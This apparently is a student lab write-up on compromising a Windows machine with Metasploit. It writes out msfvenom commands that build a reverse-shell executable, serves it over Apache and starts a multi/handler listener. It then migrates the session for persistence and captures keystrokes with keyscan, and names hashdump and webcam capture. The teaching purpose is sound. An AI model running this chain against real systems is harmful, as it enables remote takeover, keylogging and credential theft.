# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

### Developed By

#### Jaiyantan S 
#### 212224100021

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:


## Architecture Diagram

```bash
## 🛠️ Metasploit Exploitation Architecture (Windows Target)


+----------------+                           +------------------+
|  🟢 Attacker    |      🔁 Reverse Shell      |   🔴 Victim (Win) |
|  (Kali Linux)  | <------------------------- |  Unpatched SMB   |
|  - msfconsole  |       (TCP 4444)          |  RDP, AV Bypass  |
|  - handler     |                           |                  |
+-------+--------+                           +--------+---------+
        |                                             |
        |  ⚙️ Payload generation using msfvenom        |
        |                                             |
        v                                             v
msfvenom -p windows/meterpreter/reverse_tcp  -->  User clicks payload  
         LHOST=attacker_ip LPORT=4444               or exploit triggers  
         -f exe > evil.exe  

        |
        |  🧲 Listener waits (multi/handler)
        v

+------------------------------------------------------------+
|     🧠 Meterpreter Session Established (shell access)       |
+------------------------------------------------------------+
| Commands: sysinfo | hashdump | migrate | webcam_snap | etc |
+------------------------------------------------------------+

```
### PROGRAM:

Find the attackers ip address using ifconfig

### Output:
<img width="886" height="325" alt="1" src="https://github.com/user-attachments/assets/34a83447-d9a2-4acb-9fd5-e04b26fe9a57" />


Create a malicious executable file fun.exe using msenom command ``` msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe```


### Output:

<img width="809" height="470" alt="image" src="https://github.com/user-attachments/assets/5d24617f-eb11-4dae-97df-77fcfed95b28" />

copy the fun.exe into the apache ```/var/www/html ```folder



Start apache server ```sudo systemctl apache2 start``` 



Check the status of apache2 ```sudo apache2 status```


Invoke msfconsole:

Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

Starting a command and control Server ```use multi/handler``` ```set PAYLOAD windows/meterpreter/reverse_tcp``` ```set LHOST 0.0.0.0``` ```exploit```

### Output 

<img width="843" height="348" alt="3" src="https://github.com/user-attachments/assets/1c09071a-d60d-44b9-ae68-86e6d8f238eb" />

<img width="880" height="325" alt="4" src="https://github.com/user-attachments/assets/20b47388-666c-4723-aa4c-643b6bc00666" />


On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: ```http://192.168.1.2/fun.exe``` The file "fun.exe" downloads.

Bypass any warning boxes, double-click the file, and allow it to run.
On kali give the command exploit

<img width="1081" height="715" alt="image" src="https://github.com/user-attachments/assets/1628715b-f580-4f41-bec5-06b95d08e9e8" />


To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command:

migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below. Notice the "PID/Program name" value for this connection, which is redacted

#### Post Exploitation:
The target is now owned. Following are meterpreter commands for key capturing in the target machine keyscan_start Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.



keyscan_dump Shows the keystrokes captured so far

<img width="622" height="207" alt="image" src="https://github.com/user-attachments/assets/916b6527-ea1a-4664-b831-cf3eb2236e84" />



## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.

